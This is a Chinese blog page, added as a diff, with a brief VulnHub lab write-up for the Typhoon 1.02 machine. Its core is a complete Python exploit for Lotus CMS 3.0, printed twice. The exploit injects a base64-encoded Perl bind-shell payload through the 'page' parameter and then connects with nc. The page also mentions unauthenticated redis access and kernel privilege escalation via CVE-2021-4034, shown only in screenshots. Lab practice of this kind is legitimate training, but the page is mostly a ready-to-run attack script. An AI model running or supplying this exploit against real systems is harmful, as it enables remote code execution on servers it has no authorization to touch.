@@ -1,0 +1,131 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>0x019 Typhoon 1.02 | 养猪日记</title>
+<meta name=keywords content><meta name=description content='端口扫描
+
+
+这次扫描结果太多了，就不看服务扫描结果了，打眼一看全是高危端口
+渗透
+21端口：
+
+
+80端口 lotuscms成功getshell，应该还有其他洞，感觉洞很多的样子：
+# -*- coding: utf-8 -*-
+#!/usr/bin/python
+
+import socket
+import sys
+import time
+import os
+import base64
+import urllib
+
+if len(sys.argv) <= 2:
+        print "\n      EXPLOIT - BIND SHELL\n"
+        print "   - Remote Command Execution -"
+        print "     tested on: Lotus CMS 3.0\n"
+        print " Usage:"
+        print " ./"+sys.argv[0]+" [TARGET IP] [TCP PORT TO OPEN]"
+        print " Example:"
+        print " ./"+sys.argv[0]+" 192.168.10.106 4444"
+else:
+        print "\n      EXPLOIT - BIND SHELL\n"
+        print "   - Remote Command Execution -"
+        print "     tested on: Lotus CMS 3.0\n"
+        print " [*] Generating payload..."
+
+        # Monta o payload
+        payload0="perl -MIO -e &#39;$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,"+sys.argv[2]+",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>&#39;"
+        # Encoda em base64
+        payload1 = base64.b64encode(payload0)
+        # Junta tudo
+        payload2="index&#39;);system(base64_decode(&#39;"+payload1+"&#39;));#"
+        # Encoda URL
+        data="page="+urllib.quote(payload2)
+        # Calcula o tamanho do payload
+        tam = len(data)
+
+        # Monta header + body do request
+        request="POST /cms/index.php HTTP/1.1\r\n"
+        request+="Host: "+sys.argv[1]+"\r\n"
+        request+="User-Agent: Mozilla/5.0\r\n"
+        request+="Content-Type: application/x-www-form-urlencoded\r\n"
+        request+="Content-Length: "+str(tam)+"\r\n"
+        request+="Connection: close\r\n"
+        request+="\r\n"
+        request+=str(data)
+
+        # Envia o request
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((sys.argv[1],80))
+        s.send(request)
+
+        # Exibe o que enviou
+        print "\n [*] "+str(len(request))+" bytes sent..."
+        print " [*] Getting bind connection...\n"
+
+        # Conecta
+        time.sleep(2)
+        os.system("nc -vn "+sys.argv[1]+" "+sys.argv[2])
+
+'><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/vulnhub/0x019-typhoon-1.02/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/vulnhub/0x019-typhoon-1.02/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0x019 Typhoon 1.02</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;188 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEacdbbff87e00e3b1e7c2b593bc9fdd39%e6%88%aa%e5%9b%be.png alt></p><p>这次扫描结果太多了，就不看服务扫描结果了，打眼一看全是高危端口</p><h1 id=渗透>渗透<a hidden class=anchor aria-hidden=true href=#渗透>#</a></h1><p>21端口：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE1fd2eed0df441ab4c9b5033195fe119c%e6%88%aa%e5%9b%be.png alt></p><p>80端口 lotuscms成功getshell，应该还有其他洞，感觉洞很多的样子：</p><pre tabindex=0><code># -*- coding: utf-8 -*-
+#!/usr/bin/python
+
+import socket
+import sys
+import time
+import os
+import base64
+import urllib
+
+if len(sys.argv) &lt;= 2:
+        print &#34;\n      EXPLOIT - BIND SHELL\n&#34;
+        print &#34;   - Remote Command Execution -&#34;
+        print &#34;     tested on: Lotus CMS 3.0\n&#34;
+        print &#34; Usage:&#34;
+        print &#34; ./&#34;+sys.argv[0]+&#34; [TARGET IP] [TCP PORT TO OPEN]&#34;
+        print &#34; Example:&#34;
+        print &#34; ./&#34;+sys.argv[0]+&#34; 192.168.10.106 4444&#34;
+else:
+        print &#34;\n      EXPLOIT - BIND SHELL\n&#34;
+        print &#34;   - Remote Command Execution -&#34;
+        print &#34;     tested on: Lotus CMS 3.0\n&#34;
+        print &#34; [*] Generating payload...&#34;
+
+        # Monta o payload
+        payload0=&#34;perl -MIO -e &#39;$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,&#34;+sys.argv[2]+&#34;,Reuse,1,Listen)-&gt;accept;$~-&gt;fdopen($c,w);STDIN-&gt;fdopen($c,r);system$_ while&lt;&gt;&#39;&#34;
+        # Encoda em base64
+        payload1 = base64.b64encode(payload0)
+        # Junta tudo
+        payload2=&#34;index&#39;);system(base64_decode(&#39;&#34;+payload1+&#34;&#39;));#&#34;
+        # Encoda URL
+        data=&#34;page=&#34;+urllib.quote(payload2)
+        # Calcula o tamanho do payload
+        tam = len(data)
+
+        # Monta header + body do request
+        request=&#34;POST /cms/index.php HTTP/1.1\r\n&#34;
+        request+=&#34;Host: &#34;+sys.argv[1]+&#34;\r\n&#34;
+        request+=&#34;User-Agent: Mozilla/5.0\r\n&#34;
+        request+=&#34;Content-Type: application/x-www-form-urlencoded\r\n&#34;
+        request+=&#34;Content-Length: &#34;+str(tam)+&#34;\r\n&#34;
+        request+=&#34;Connection: close\r\n&#34;
+        request+=&#34;\r\n&#34;
+        request+=str(data)
+
+        # Envia o request
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((sys.argv[1],80))
+        s.send(request)
+
+        # Exibe o que enviou
+        print &#34;\n [*] &#34;+str(len(request))+&#34; bytes sent...&#34;
+        print &#34; [*] Getting bind connection...\n&#34;
+
+        # Conecta
+        time.sleep(2)
+        os.system(&#34;nc -vn &#34;+sys.argv[1]+&#34; &#34;+sys.argv[2])
+</code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEf0363f514b3370f3c733d384c145ed7d%e6%88%aa%e5%9b%be.png alt></p><h1 id=提权>提权<a hidden class=anchor aria-hidden=true href=#提权>#</a></h1><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE4295a666d82f90384110925b6e478f06%e6%88%aa%e5%9b%be.png alt></p><p>redis未授权应该是有的</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE1d35b284a99f37d5943f82a16dda9360%e6%88%aa%e5%9b%be.png alt></p><p>有GCC直接内核提权</p><p>CVE-2021-4034</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEff87f9ee0325bd0df0f9d036761e4283%e6%88%aa%e5%9b%be.png alt></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/htb/0x019-object/><span class=title>« Prev</span><br><span>0X019 object</span>
+</a><a class=next href=http://localhost:1313/posts/vulnhub/0x020-bulldog-1-/><span class=title>Next »</span><br><span>0x020 Bulldog 1</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
